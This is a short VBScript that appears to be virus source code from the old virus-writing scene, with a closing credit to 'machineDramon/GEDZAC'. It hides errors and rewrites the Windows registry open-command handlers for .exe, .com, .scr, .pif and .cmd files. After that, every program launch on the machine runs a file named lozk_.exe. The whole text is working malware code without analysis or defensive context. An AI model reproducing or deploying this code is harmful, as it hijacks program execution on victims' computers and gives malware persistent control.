On Error Resume Next
Set LozK = CreateObject("WScript.Shell")
s="C:\NV\lozk_.exe @%1@": s=replace(s,"@",chr(34))
LozK.RegWrite "HKEY_CLASSES_ROOT\exefile\shell\open\command\",s
LozK.RegWrite "HKEY_CLASSES_ROOT\comfile\shell\open\command\",s
LozK.RegWrite "HKEY_CLASSES_ROOT\scrfile\shell\open\command\",s
LozK.RegWrite "HKEY_CLASSES_ROOT\piffile\shell\open\command\",s
LozK.RegWrite "HKEY_CLASSES_ROOT\cmdfile\shell\open\command\",s
REM Thanx To machineDramon/GEDZAC
